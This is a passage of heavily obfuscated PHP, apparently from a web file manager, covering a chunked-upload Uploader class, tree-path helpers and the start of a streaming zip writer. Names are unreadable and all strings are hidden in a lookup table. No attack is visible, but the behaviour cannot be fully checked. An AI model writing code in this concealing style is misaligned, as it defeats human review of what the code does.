$B∑»±©Ì∂‚); } goto CÔªóíΩ©â; eìıÒÏ†ßì: $c…◊Ì”π‘ò =& $_SERVER[Æ¡î¢≠¯™]; $B√≈áò√∏Ô = array(); foreach ($Aƒô–ê´Ã as &$a±ßÎùßèÉ) { $B√≈áò√∏Ô[$a±ßÎùßèÉ[$c…◊Ì”π‘ò[2061]]] = $a±ßÎùßèÉ[$c…◊Ì”π‘ò[28]]; $EóÕ∂Ë∆‰ú = $this->parentLevelArray($a±ßÎùßèÉ[$c…◊Ì”π‘ò[463]]); foreach ($EóÕ∂Ë∆‰ú as $a≥º“ñòΩ ) { if (!isset($B√≈áò√∏Ô[$a≥º“ñòΩ ])) { $B√≈áò√∏Ô[$a≥º“ñòΩ ] = 0; } } } goto aÃ˜”ƒÛÀ∫; CÔªóíΩ©â: } private function _listAppendSourceRoot(&$fÖÀÿ§“ò‰, $e∞≠ﬂ‹‚ü◊) { goto E©‡–€‘Óê; B¡ÌóÊù‰—: $bÍ£ÖÊÇπÛ = Model($FÇ®ÖÃıúÌ[744])->order($FÇ®ÖÃıúÌ[2148])->field($CãòØƒôπê)->where($D‰ÖÁæëàó)->select(); $bÍ£ÖÊÇπÛ = array_to_keyvalue($bÍ£ÖÊÇπÛ, $FÇ®ÖÃıúÌ[460]); $bÍ£ÖÊÇπÛ = array_remove_key($bÍ£ÖÊÇπÛ, $FÇ®ÖÃıúÌ[460]); goto BÍ•ûÓö¡Œ; BÍ•ûÓö¡Œ: foreach ($fÖÀÿ§“ò‰ as &$cöÃ≤ÎÿüÕ) { $cöÃ≤ÎÿüÕ[$FÇ®ÖÃıúÌ[396]] = $bÍ£ÖÊÇπÛ[$cöÃ≤ÎÿüÕ[$FÇ®ÖÃıúÌ[2061]]] ? $bÍ£ÖÊÇπÛ[$cöÃ≤ÎÿüÕ[$FÇ®ÖÃıúÌ[2061]]] : array(); } goto FÚÚâﬁŸ∞›; E©‡–€‘Óê: $FÇ®ÖÃıúÌ =& $_SERVER[Æ¡î¢≠¯™]; $D‰ÖÁæëàó = array($FÇ®ÖÃıúÌ[376] => SourceModel::TYPE_GROUP, $FÇ®ÖÃıúÌ[465] => 0, $FÇ®ÖÃıúÌ[460] => array($FÇ®ÖÃıúÌ[7], $e∞≠ﬂ‹‚ü◊)); $CãòØƒôπê = $FÇ®ÖÃıúÌ[2147]; goto B¡ÌóÊù‰—; FÚÚâﬁŸ∞›: } protected function resetParentLevel() { $aµ–√Ï∆»∫ =& $_SERVER[Æ¡î¢≠¯™]; $BçíûÍáÀ√ = $aµ–√Ï∆»∫[2061]; $bíπΩ®≈ƒÏ = $this->select(); $bíπΩ®≈ƒÏ = array_to_keyvalue($bíπΩ®≈ƒÏ, $BçíûÍáÀ√); foreach ($bíπΩ®≈ƒÏ as $AÇâÜ—†éÓ) { goto E∑©ø£√°≠; E∑©ø£√°≠: $fÃù—∏Ωµ÷ = $AÇâÜ—†éÓ; $D≥√ÍÒç∆ = array(); while ($fÃù—∏Ωµ÷[$aµ–√Ï∆»∫[465]] != 0) { $D≥√ÍÒç∆[] = $fÃù—∏Ωµ÷[$aµ–√Ï∆»∫[465]]; $fÃù—∏Ωµ÷ = $bíπΩ®≈ƒÏ[$fÃù—∏Ωµ÷[$aµ–√Ï∆»∫[465]]]; } goto eÍ˜„≤ÇÂ‹; dÇõ±ﬁÂﬂ™: $this->where(array($BçíûÍáÀ√ => $AÇâÜ—†éÓ[$BçíûÍáÀ√]))->save(array($aµ–√Ï∆»∫[529] => $D≥√ÍÒç∆)); goto Féä‚É∆Âﬁ; eÍ˜„≤ÇÂ‹: $D≥√ÍÒç∆[] = 0; $D≥√ÍÒç∆ = $aµ–√Ï∆»∫[47] . implode($aµ–√Ï∆»∫[47], array_reverse($D≥√ÍÒç∆)) . $aµ–√Ï∆»∫[47]; $this->setNamePinyin($AÇâÜ—†éÓ[$BçíûÍáÀ√], $AÇâÜ—†éÓ[$aµ–√Ï∆»∫[28]]); goto dÇõ±ﬁÂﬂ™; Féä‚É∆Âﬁ: } return $bíπΩ®≈ƒÏ; } public function groupNameAuto($bÒÈ»óµ √, $d¬Ò”áıŸ∏) { $FÖı•É„ö¢ =& $_SERVER[Æ¡î¢≠¯™]; $A—«ãÆîËë = $this->where(array($FÖı•É„ö¢[373] => $bÒÈ»óµ √))->getField($FÖı•É„ö¢[28], !0); if (!$A—«ãÆîËë || !in_array($d¬Ò”áıŸ∏, $A—«ãÆîËë)) { return $d¬Ò”áıŸ∏; } for ($FÈ©Ï’µ¢ç = 1; $FÈ©Ï’µ¢ç <= count($A—«ãÆîËë) + 1; $FÈ©Ï’µ¢ç++) { $DÔ˘Ì⁄êÃô = $d¬Ò”áıŸ∏ . "\50{$FÈ©Ï’µ¢ç}\x29"; if (!in_array($DÔ˘Ì⁄êÃô, $A—«ãÆîËë)) { return $DÔ˘Ì⁄êÃô; } } } } goto B¯ÓÚüßÉ—; cçƒ∑Õ¶‹ç: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto eêÆıö¡Çå; eêÆıö¡Çå: $Eä∫åß¢˘Ú =& $_SERVER[Æ¡î¢≠¯™]; global $in; $this->in =& $in; goto bœ…†ôÇµ†; bœ…†ôÇµ†: if (!empty($_FILES)) { $f∆Ë¨‡éªÌ = $_FILES[$Eä∫åß¢˘Ú[174]]; $this->uploadFile = $f∆Ë¨‡éªÌ[$Eä∫åß¢˘Ú[1924]]; if (!$this->uploadFile && $f∆Ë¨‡éªÌ[$Eä∫åß¢˘Ú[1197]] > 0) { show_json($this->errorInfo($f∆Ë¨‡éªÌ[$Eä∫åß¢˘Ú[1197]]), !1); } } else { if (isset($in[$Eä∫åß¢˘Ú[391]])) { $this->uploadFile = isset($in[$Eä∫åß¢˘Ú[1925]]) ? $Eä∫åß¢˘Ú[1926] : $Eä∫åß¢˘Ú[1770]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto BÎÔäÑ¢íµ; BÎÔäÑ¢íµ: $this->checkSize(); $this->tempPathInit(); goto eãôøâéÓé; eãôøâéÓé: } public function upload() { goto d∞ ›¬ÏÈœ; F√’ò†Ößﬁ: $bàæÉ∫Ûàÿ = $this->moveUploadedFile($eƒ≥Æòùßí); if ($f›¯ˆì‚◊ï > 0 && filesize($bàæÉ∫Ûàÿ) == 0) { $this->showJson($D” ÉˆÂú[1932], !1); } if (!$bàæÉ∫Ûàÿ) { $this->showJson(LNG($D” ÉˆÂú[1933]), !1); } goto cÏÔ£ä…£π; fª¯º…‡ÃÎ: $eƒ≥Æòùßí = $this->tempFile . $D” ÉˆÂú[1929] . $fˆ∂¯ç‡ïÚ; $f›¯ˆì‚◊ï = isset($this->in[$D” ÉˆÂú[524]]) ? intval($this->in[$D” ÉˆÂú[524]]) : 0; $b≈ï∫«ÙÏõ = isset($this->in[$D” ÉˆÂú[1930]]) ? intval($this->in[$D” ÉˆÂú[1930]]) : 0; goto dﬂëµ¢‚Ê˜; cÏÔ£ä…£π: $aÈ√£√Ò·Ø = $fˆ∂¯ç‡ïÚ * $b≈ï∫«ÙÏõ; $b®∆°Ùú≤å = @fopen($this->tempFile, $D” ÉˆÂú[1934]); fseek($b®∆°Ùú≤å, $aÈ√£√Ò·Ø); goto AØﬁ–°§£ ; dﬂëµ¢‚Ê˜: if ($c‚—º‰Ã¯√ > 1 && $b≈ï∫«ÙÏõ <= 0) { show_json($D” ÉˆÂú[1931], !1); } if ($b≈ï∫«ÙÏõ > $f›¯ˆì‚◊ï) { $c‚—º‰Ã¯√ = 1; } if ($c‚—º‰Ã¯√ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Cë≠ËÓÃµ¥; d∞ ›¬ÏÈœ: $D” ÉˆÂú =& $_SERVER[Æ¡î¢≠¯™]; $fˆ∂¯ç‡ïÚ = isset($this->in[$D” ÉˆÂú[1927]]) ? intval($this->in[$D” ÉˆÂú[1927]]) : 0; $c‚—º‰Ã¯√ = isset($this->in[$D” ÉˆÂú[1928]]) ? intval($this->in[$D” ÉˆÂú[1928]]) : 1; goto fª¯º…‡ÃÎ; D˜¡ˆΩ≈≥˘: @unlink($bàæÉ∫Ûàÿ); if (!$f‹ç≈†úïâ) { $this->showJson($D” ÉˆÂú[1935] . $fˆ∂¯ç‡ïÚ, !1); } $Aâ´Õ“Çƒÿ[$D” ÉˆÂú[1936]] = $c‚—º‰Ã¯√; goto Cã‚Çµ≈“á; Cã‚Çµ≈“á: $Aâ´Õ“Çƒÿ[$D” ÉˆÂú[1937]][$D” ÉˆÂú[1938] . $fˆ∂¯ç‡ïÚ] = array($D” ÉˆÂú[1939] => $aÈ√£√Ò·Ø, $D” ÉˆÂú[1022] => $fˆ∂¯ç‡ïÚ, $D” ÉˆÂú[87] => $f›¯ˆì‚◊ï, $D” ÉˆÂú[171] => $a´‚æ ¿óÂ); $this->statusSet($Aâ´Õ“Çƒÿ); if (count($Aâ´Õ“Çƒÿ[$D” ÉˆÂú[1937]]) != $Aâ´Õ“Çƒÿ[$D” ÉˆÂú[1936]]) { $this->showJson($D” ÉˆÂú[1940] . $fˆ∂¯ç‡ïÚ, !0); } goto Cÿû†ø÷πµ; Cÿû†ø÷πµ: ignore_timeout(); if (!$this->checkChunkHash($Aâ´Õ“Çƒÿ)) { $this->showJson($D” ÉˆÂú[1941], !1); } $this->statusSet(!1); goto EçúÛÇ†öÃ; EçúÛÇ†öÃ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto F÷»ëª‰ª⁄; Cë≠ËÓÃµ¥: CacheLock::lock($this->tempFile, 20); $Aâ´Õ“Çƒÿ = $this->statusGet(); $this->initFileTemp(); goto F√’ò†Ößﬁ; AØﬁ–°§£ : $f‹ç≈†úïâ = $this->writeTo($bàæÉ∫Ûàÿ, $b®∆°Ùú≤å, $this->tempFile); $a´‚æ ¿óÂ = IO::hashSimple($bàæÉ∫Ûàÿ); $f›¯ˆì‚◊ï = IO::size($bàæÉ∫Ûàÿ); goto D˜¡ˆΩ≈≥˘; F÷»ëª‰ª⁄: } private function checkSize() { $dâŸÚû«ò‚ =& $_SERVER[Æ¡î¢≠¯™]; if (phpBuild64() || $this->in[$dâŸÚû«ò‚[87]] < PHP_INT_MAX) { return; } show_json(LNG($dâŸÚû«ò‚[1942]), !1); } private function showJson($F¯©¿ã•ß¬, $dº ö´‚≥ç) { CacheLock::unlock($this->tempFile); if (!$dº ö´‚≥ç) { return show_json($F¯©¿ã•ß¬, $dº ö´‚≥ç); } show_json($F¯©¿ã•ß¬, $dº ö´‚≥ç); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto F€≠°ÇùÁÑ; aÏïÛâ√®: $this->tempFile = $e€À–„¶àÕ . $bô…ŸÑÑüä[1945] . md5($EÁÂñÍ„´• . $this->in[$bô…ŸÑÑüä[1488]]); goto cµ©ÑŒ»Ÿì; F€≠°ÇùÁÑ: $bô…ŸÑÑüä =& $_SERVER[Æ¡î¢≠¯™]; $e€À–„¶àÕ = TEMP_FILES; @mk_dir($e€À–„¶àÕ); goto bÒãˆ§àçù; bÒãˆ§àçù: touch($e€À–„¶àÕ . $bô…ŸÑÑüä[1943]); $EÁÂñÍ„´• = isset($this->in[$bô…ŸÑÑüä[1944]]) ? $this->in[$bô…ŸÑÑüä[1944]] : !1; if (strlen($EÁÂñÍ„´•) < 30) { $EÁÂñÍ„´• = md5(USER_ID . $this->in[$bô…ŸÑÑüä[85]] . $this->fileName . $this->in[$bô…ŸÑÑüä[87]]); } goto aÏïÛâ√®; cµ©ÑŒ»Ÿì: } private function moveUploadedFile($c—ùﬂÍ‘≈ë) { $a‹¥Ûõ£ÃÊ =& $_SERVER[Æ¡î¢≠¯™]; $A⁄‹î≥¡€è = $this->uploadFile; if ($A⁄‹î≥¡€è == $a‹¥Ûõ£ÃÊ[1946]) { @file_put_contents($c—ùﬂÍ‘≈ë, base64_decode($_REQUEST[$a‹¥Ûõ£ÃÊ[1947]])); } else { if ($A⁄‹î≥¡€è == $a‹¥Ûõ£ÃÊ[1770]) { $F——‡Õ≠Ñ‘ = @fopen($c—ùﬂÍ‘≈ë, $a‹¥Ûõ£ÃÊ[1477]); $this->writeTo($A⁄‹î≥¡€è, $F——‡Õ≠Ñ‘, $c—ùﬂÍ‘≈ë); } else { if (!move_uploaded_file($A⁄‹î≥¡€è, $c—ùﬂÍ‘≈ë)) { return !1; } } } return $c—ùﬂÍ‘≈ë; } private function writeTo($cö‡≥ëï¿Õ, $dÎâòã˘éì, $c ß‡ Íçã) { goto Dá∆´ÔÀè±; f÷€â•Ë∞Ÿ: fclose($cÉá‡â¿π•); fclose($dÎâòã˘éì); CacheLock::unlock($aÖ¶è§ÜÑı); goto eêàÊü™◊ß; Dá∆´ÔÀè±: $dÜœÉáœ®Ô =& $_SERVER[Æ¡î¢≠¯™]; $aÖ¶è§ÜÑı = $dÜœÉáœ®Ô[1948] . $c ß‡ Íçã; $EÇî§®Óﬁø = CacheLock::lock($aÖ¶è§ÜÑı, 1); goto fíéõ”‘íÔ; fíéõ”‘íÔ: $cÉá‡â¿π• = @fopen($cö‡≥ëï¿Õ, $dÜœÉáœ®Ô[1476]); if (!$cÉá‡â¿π• || !$dÎâòã˘éì || !$EÇî§®Óﬁø) { CacheLock::unlock($aÖ¶è§ÜÑı); return !1; } while (!feof($cÉá‡â¿π•)) { fwrite($dÎâòã˘éì, fread($cÉá‡â¿π•, 1024 * 200)); } goto f÷€â•Ë∞Ÿ; eêàÊü™◊ß: return !0; goto bö§˜€·ëﬁ; bö§˜€·ëﬁ: } private function statusGet() { goto D‰˜ÖÇªπ∏; D‰˜ÖÇªπ∏: $Eª†‰‚Ü≥’ =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($this->statusData)) { return $this->statusData; } $e≤ç≥ÇËµç = $this->tempFile . $Eª†‰‚Ü≥’[1949]; goto EöÎ–¡‘£ã; EöÎ–¡‘£ã: $A§à´ıåã¬ = !1; if (file_exists($e≤ç≥ÇËµç)) { $A§à´ıåã¬ = @file_get_contents($e≤ç≥ÇËµç); } if ($A§à´ıåã¬) { $this->statusData = unserialize($A§à´ıåã¬); } goto aÔ‘ú…çÂ˜; aÔ‘ú…çÂ˜: if (!$this->statusData) { $AπŸ⁄ÁÚ√• = array($Eª†‰‚Ü≥’[28] => $this->fileName, $Eª†‰‚Ü≥’[1936] => 0, $Eª†‰‚Ü≥’[1937] => array()); $this->statusSet($AπŸ⁄ÁÚ√•); } return $this->statusData; goto CáπÌ…’Æ‚; CáπÌ…’Æ‚: } public function statusSet($EŸ¢ΩΩû˜«) { $E°Ã›“æìœ = $this->tempFile . $_SERVER[Æ¡î¢≠¯™][1949]; if (!$EŸ¢ΩΩû˜«) { if (file_exists($E°Ã›“æìœ)) { @unlink($E°Ã›“æìœ); } return !0; } $this->statusData = $EŸ¢ΩΩû˜«; return file_put_contents($E°Ã›“æìœ, serialize($EŸ¢ΩΩû˜«)); } private function initFileTemp() { $e≠›’åﬂí¯ =& $_SERVER[Æ¡î¢≠¯™]; if (file_exists($this->tempFile)) { return; } $Eıï€ÌáÊ≈ = fopen($this->tempFile, $e≠›’åﬂí¯[1950]); fseek($Eıï€ÌáÊ≈, $this->in[$e≠›’åﬂí¯[87]] - 1, SEEK_SET); fwrite($Eıï€ÌáÊ≈, $e≠›’åﬂí¯[472]); fclose($Eıï€ÌáÊ≈); } public function checkChunk() { goto cÕùê≥êê»; cŒ«§≠Üßè: return $aÓø‰©ñÊ•; goto Dñ◊¿ƒçæ≠; cÕùê≥êê»: $bÙﬁŒˆ‰ñÑ =& $_SERVER[Æ¡î¢≠¯™]; $aÓø‰©ñÊ• = array(); CacheLock::lock($this->tempFile); goto FÓ¨µƒæˆ‘; FÓ¨µƒæˆ‘: $Cµ ÷àÔéÇ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Cµ ÷àÔéÇ[$bÙﬁŒˆ‰ñÑ[1937]] as $b¡≤“±òÔÑ) { $C¢û¯‡ùÙ• = $b¡≤“±òÔÑ[$bÙﬁŒˆ‰ñÑ[171]]; if ($C¢û¯‡ùÙ•) { $aÓø‰©ñÊ•[$bÙﬁŒˆ‰ñÑ[1951] . $b¡≤“±òÔÑ[$bÙﬁŒˆ‰ñÑ[1022]]] = $C¢û¯‡ùÙ•; } } goto cŒ«§≠Üßè; Dñ◊¿ƒçæ≠: } private function checkChunkHash($bäè€Üó‘≤) { goto cáï≤€îœ€; E¡òƒê†‰ê: return $C°óàπˆ«∫; goto Bπ≈Øœ¿œÎ; cáï≤€îœ€: $BÒ‡øÁı√… =& $_SERVER[Æ¡î¢≠¯™]; if (count($bäè€Üó‘≤[$BÒ‡øÁı√…[1937]]) != $bäè€Üó‘≤[$BÒ‡øÁı√…[1936]]) { return !1; } $EôÇ†üê—À = _get($this->in, $BÒ‡øÁı√…[1944]); goto c†™Ï∑È™à; AºÌÇ§¨¬ø: $C°óàπˆ«∫ = !0; foreach ($bäè€Üó‘≤[$BÒ‡øÁı√…[1937]] as $Aîíë–Øòâ) { fseek($f‰≈Ûö™–õ, $Aîíë–Øòâ[$BÒ‡øÁı√…[1939]]); $B©±ûÌæ¯⁄ = PathDriverStream::hash($f‰≈Ûö™–õ, $Aîíë–Øòâ[$BÒ‡øÁı√…[87]]); if ($Aîíë–Øòâ[$BÒ‡øÁı√…[171]] != $B©±ûÌæ¯⁄) { $C°óàπˆ«∫ = !1; break; } } fclose($f‰≈Ûö™–õ); goto E¡òƒê†‰ê; c†™Ï∑È™à: $a∞¿Â∆ùîÇ = _get($this->in, $BÒ‡øÁı√…[1952]); if (strlen($a∞¿Â∆ùîÇ) == 32 && IO::hashSimple($this->tempFile) == $EôÇ†üê—À && IO::hashMd5($this->tempFile) == $a∞¿Â∆ùîÇ) { return !0; } $f‰≈Ûö™–õ = fopen($this->tempFile, $BÒ‡øÁı√…[1148]); goto AºÌÇ§¨¬ø; Bπ≈Øœ¿œÎ: } public static function fileName() { goto EﬂÈÂ¨∆¡«; EﬂÈÂ¨∆¡«: $B¯ûÖ˘ÀÁÂ =& $_SERVER[Æ¡î¢≠¯™]; global $in; $FÑº‚Ï–’ç = isset($in[$B¯ûÖ˘ÀÁÂ[28]]) ? $in[$B¯ûÖ˘ÀÁÂ[28]] : $B¯ûÖ˘ÀÁÂ[33]; goto bØÆ´Û⁄Ëä; bÉ√Ü“Ñá®: if ($bŒ∏ÿ»©‹± == $B¯ûÖ˘ÀÁÂ[1954] || $bŒ∏ÿ»©‹± == $B¯ûÖ˘ÀÁÂ[1955]) { $FÑº‚Ï–’ç = date($B¯ûÖ˘ÀÁÂ[682], $bãà≥„ñìÚ) . $B¯ûÖ˘ÀÁÂ[80] . $in[$B¯ûÖ˘ÀÁÂ[87]] . $B¯ûÖ˘ÀÁÂ[1585]; } else { if ($bŒ∏ÿ»©‹± == $B¯ûÖ˘ÀÁÂ[1956]) { $FÑº‚Ï–’ç = date($B¯ûÖ˘ÀÁÂ[682], $bãà≥„ñìÚ) . $B¯ûÖ˘ÀÁÂ[80] . $in[$B¯ûÖ˘ÀÁÂ[87]] . $B¯ûÖ˘ÀÁÂ[1957]; } } return $FÑº‚Ï–’ç; goto aÑ£◊«≤Ûı; Fâ√‹ëßçÂ: $bãà≥„ñìÚ = strtotime($in[$B¯ûÖ˘ÀÁÂ[1953]]); $bãà≥„ñìÚ = $bãà≥„ñìÚ ? $bãà≥„ñìÚ : time(); $bŒ∏ÿ»©‹± = strtolower($FÑº‚Ï–’ç); goto bÉ√Ü“Ñá®; bØÆ´Û⁄Ëä: if (!empty($_FILES)) { $FÑº‚Ï–’ç = $FÑº‚Ï–’ç ? $FÑº‚Ï–’ç : $_FILES[$B¯ûÖ˘ÀÁÂ[174]][$B¯ûÖ˘ÀÁÂ[391]]; } $FÑº‚Ï–’ç = str_replace(array($B¯ûÖ˘ÀÁÂ[105], $B¯ûÖ˘ÀÁÂ[8]), array($B¯ûÖ˘ÀÁÂ[8], $B¯ûÖ˘ÀÁÂ[103]), trim($FÑº‚Ï–’ç)); if (!is_wap()) { return $FÑº‚Ï–’ç; } goto Fâ√‹ëßçÂ; aÑ£◊«≤Ûı: } private function errorInfo($F◊ÂòÚßµı) { $B⁄∑ÊÀÀëÛ =& $_SERVER[Æ¡î¢≠¯™]; $dÖ√ëªø∑° = array($B⁄∑ÊÀÀëÛ[1958], $B⁄∑ÊÀÀëÛ[1959], $B⁄∑ÊÀÀëÛ[1960], $B⁄∑ÊÀÀëÛ[1961], $B⁄∑ÊÀÀëÛ[1962], $B⁄∑ÊÀÀëÛ[1963], $B⁄∑ÊÀÀëÛ[1964], $B⁄∑ÊÀÀëÛ[1965]); return $F◊ÂòÚßµı . $B⁄∑ÊÀÀëÛ[4] . $dÖ√ëªø∑°[$F◊ÂòÚßµı]; } } class ZipMake { const VERSION = "\60\x2e\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($Dœ° àò·’ = null) { $d¨®∆åù’é =& $_SERVER[Æ¡î¢≠¯™]; $this->outputStream = fopen($d¨®∆åù’é[1966], $d¨®∆åù’é[1204]); $this->outputName = $Dœ° àò·’; $this->needHeaders = !0; } public function addFile($DÕÌ‡£†‹™, $Dﬁµì±£ô√) { goto fÇˆñºÎñ¶; DœäÜ∞‹¡´: $this->addFileFooter($DÕÌ‡£†‹™, $Fπ°»é¿£’, $Aµ‘√Ûãú, $b«Ô ∑èóú, $bæ˜“É«ŸŒ, $aË€µÿäêÌ); goto a—ç¢Ü´†…; aøı˜€èôá: $aË€µÿäêÌ = $this->addFileHeader($DÕÌ‡£†‹™, $Fπ°»é¿£’); $b«Ô ∑èóú = $bæ˜“É«ŸŒ = filesize($Dﬁµì±£ô√); $bò∆ÁßıË± = fopen($Dﬁµì±£ô√, $bôåòÎ…’ﬂ[1967]); goto c˜∞Çâ÷«õ; fÇˆñºÎñ¶: $bôåòÎ…’ﬂ =& $_SERVER[Æ¡î¢≠¯™]; $DÕÌ‡£†‹™ = $this->filterFilename($DÕÌ‡£†‹™); $Fπ°»é¿£’ = static::METHOD_STORE; goto aøı˜€èôá; c˜∞Çâ÷«õ: while (!feof($bò∆ÁßıË±)) { $eºÉíë‚Ç  = fread($bò∆ÁßıË±, 1048576); $this->send($eºÉíë‚Ç ); } fclose($bò∆ÁßıË±); $Aµ‘√Ûãú = hexdec(hash_file($bôåòÎ…’ﬂ[1968], $Dﬁµì±£ô√)); goto DœäÜ∞‹¡´; a—ç¢Ü´†…: } public function addFileFromStream($D‘ÂõÍ§Ù—, $a«ÉΩ¨Ë“Ï) { goto dçÜ∆ï„ÌÍ; dçÜ∆ï„ÌÍ: $D‘ÂõÍ§Ù— = $this->filterFilename($D‘ÂõÍ§Ù—); $fêÜŒÓòÕ° = static::METHOD_STORE; $cãÊ…îÈÒ∞ = $this->addFileHeader($D‘ÂõÍ§Ù—, $fêÜŒÓòÕ°); goto bâ≤ÂéÖ˜‡; A∏èî∫∆∆ñ: $this->addFileFooter($D‘ÂõÍ§Ù—, $fêÜŒÓòÕ°, $Bîπ§ùÏÚ, $bµÌø”ºíá, $CÊëÿÎ‰àä, $cãÊ…îÈÒ∞); goto Bå≤ÜŒ‘¥Ó; bâ≤ÂéÖ˜‡: fseek($a«ÉΩ¨Ë“Ï, 0, SEEK_END); $bµÌø”ºíá = $CÊëÿÎ‰àä = ftell($a«ÉΩ¨Ë“Ï); rewind($a«ÉΩ¨Ë“Ï); goto b¶â•íàÔ∞; b¶â•íàÔ∞: $E∏ä¥ÕÕù‹ = hash_init($_SERVER[Æ¡î¢≠¯™][1968]); while (!feof($a«ÉΩ¨Ë“Ï)) { $aàÁàÎﬂ´∞ = fread($a«ÉΩ¨Ë“Ï, 1048576); hash_update($E∏ä¥ÕÕù‹, $aàÁàÎﬂ´∞); $this->send($aàÁàÎﬂ´∞); } $Bîπ§ùÏÚ = hexdec(hash_final($E∏ä¥ÕÕù‹)); goto A∏èî∫∆∆ñ; Bå≤ÜŒ‘¥Ó: } public function finish() { foreach ($this->files as $F§ñ™™©é†) { $this->addCdrFile($F§ñ™™©é†); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($eâÂŒÉ¨Ö–, $Eà‡ò∞àÓÎ) { goto a¥‰•ãò˘¥; B†ëâ¥ﬁ√Û: return strlen($D∫€¬ÿëáµ) + $D≠Ê¶ïıëó + strlen($BﬁõùŸ…åò); goto Cˆé’……ƒÀ; Aˆ•‹â®Êö: $D∫€¬ÿëáµ = $this->packFields($e¡Â€îñÂé); $BﬁõùŸ…åò = $this->packFields($fªˆ‘π—»≥); $this->send($D∫€¬ÿëáµ . $eâÂŒÉ¨Ö– . $BﬁõùŸ…åò); goto B†ëâ¥ﬁ√Û; aåøŒ¿Ùáè: $b¡èÏºæÿÌ = $this->dosTime(time()); $e¡Â€îñÂé = array(array($C‚€ùÑÕıú[1970], static::FILE_HEADER_SIGNATURE), array($C‚€ùÑÕıú[1971], static::ZIP_VERSION_64), array($C‚€ùÑÕıú[1971], 8), array($C‚€ùÑÕıú[1971], $Eà‡ò∞àÓÎ), array($C‚€ùÑÕıú[1970], $b¡èÏºæÿÌ), array($C‚€ùÑÕıú[1970], 0), array($C‚€ùÑÕıú[1970], 4294967295), array($C‚€ùÑÕıú[1970], 4294967295), array($C‚€ùÑÕıú[1971], $D≠Ê¶ïıëó), array($C‚€ùÑÕıú[1971], 32)); $fªˆ‘π—»≥ = array(array($C‚€ùÑÕıú[1971], 1), array($C‚€ùÑÕıú[1971], 28), array($C‚€ùÑÕıú[1972], 0), array($C‚€ùÑÕıú[1972], 0), array($C‚€ùÑÕıú[1972], 0), array($C‚€ùÑÕıú[1970], 0)); goto Aˆ•‹â®Êö; a¥‰•ãò˘¥: $C‚€ùÑÕıú =& $_SERVER[Æ¡î¢≠¯™]; $eâÂŒÉ¨Ö– = preg_replace($C‚€ùÑÕıú[1969], $C‚€ùÑÕıú[33], $eâÂŒÉ¨Ö–); $D≠Ê¶ïıëó = strlen($eâÂŒÉ¨Ö–); goto aåøŒ¿Ùáè; Cˆé’……ƒÀ: } protected function addFileFooter($Bëπ• âÎÜ, $cãê°ﬁàŸ§, $fÒÑè©ÛÃ, $C÷áÆê¥ªŸ, $F√≈à˜áÑä, $A««ºÀ®∞È) { $c›Ô¶≠—¡ =& $_SERVER[Æ¡î¢≠¯™]; $F∏çãó«•Â = array(array($c›Ô¶≠—¡[1970], static::DATA_DESCRIPTOR_SIGNATURE), array($c›Ô¶≠—¡[1970], $fÒÑè©ÛÃ), array($c›Ô¶≠—¡[1972], $C÷áÆê¥ªŸ), array($c›Ô¶≠—¡[1972], $F√≈à˜áÑä)); $CÖ™ÊŸΩ™ = $this->packFields($F∏çãó«•Â); $this->send($CÖ™ÊŸΩ™); $fÎâ∂ò≠≥ê = $A««ºÀ®∞È + $C÷áÆê¥ªŸ + $D∂èﬁ°ñ¢¬; $this->addToCdr($Bëπ• âÎÜ, $cãê°ﬁàŸ§, $fÒÑè©ÛÃ, $C÷áÆê¥ªŸ, $F√≈à˜áÑä, $fÎâ∂ò≠≥ê); } private function addToCdr($b«µåûÚëù, $EÀåéñ…ñæ, $b≠˘ß¥ø¯€, $e†®Á°™ê», $DÈÁäÇÉüì, $Có’Òª¯¨ä) { $this->files[] = array($b«µåûÚëù, $EÀåéñ…ñæ, $b≠˘ß¥ø¯€, $e†®Á°™ê», $DÈÁäÇÉüì, $this->ofs); $this->ofs += $Có’Òª¯¨ä; } protected function addCdrFile($AÔ‹∑»à†Ÿ) { goto A‰‘Ç‰Ø·Ï; E¡Æº◊Ô´¨: $this->send($c±Î±âøﬁ); $this->cdr_ofs += strlen($c±Î±âøﬁ); goto DíÆ˜‘âÍß; FÒ¢àæû—•: $eùÕ€‹»±Ë = $this->packFields($aßü–™ŸÓ∂); $f¿ò¿Ó·áå = $this->packFields($bèÕÔéûÎâ); $c±Î±âøﬁ = $eùÕ€‹»±Ë . $A¡øÉπ‘±í . $F¢€…ï„ˆ∏ . $f¿ò¿Ó·áå; goto E¡Æº◊Ô´¨; Aæ“®êﬁËî: $bÜœË˘çœ◊ = $this->dosTime(time()); $aßü–™ŸÓ∂ = array(array($fêÌä‡±óâ[1970], static::CDR_FILE_SIGNATURE), array($fêÌä‡±óâ[1971], static::ZIP_VERSION_64), array($fêÌä‡±óâ[1971], static::ZIP_VERSION_64), array($fêÌä‡±óâ[1971], 8), array($fêÌä‡±óâ[1971], $DΩ®’îøçÖ), array($fêÌä‡±óâ[1970], $bÜœË˘çœ◊), array($fêÌä‡±óâ[1970], $cºÁ∂ÏÌîê), array($fêÌä‡±óâ[1970], 4294967295), array($fêÌä‡±óâ[1970], 4294967295), array($fêÌä‡±óâ[1971], strlen($A¡øÉπ‘±í)), array($fêÌä‡±óâ[1971], 32), array($fêÌä‡±óâ[1971], strlen($F¢€…ï„ˆ∏)), array($fêÌä‡±óâ[1971], 0), array($fêÌä‡±óâ[1971], 0), array($fêÌä‡±óâ[1970], 32), array($fêÌä‡±óâ[1970], 4294967295)); $bèÕÔéûÎâ = array(array($fêÌä‡±óâ[1971], 1), array($fêÌä‡±óâ[1971], 28), 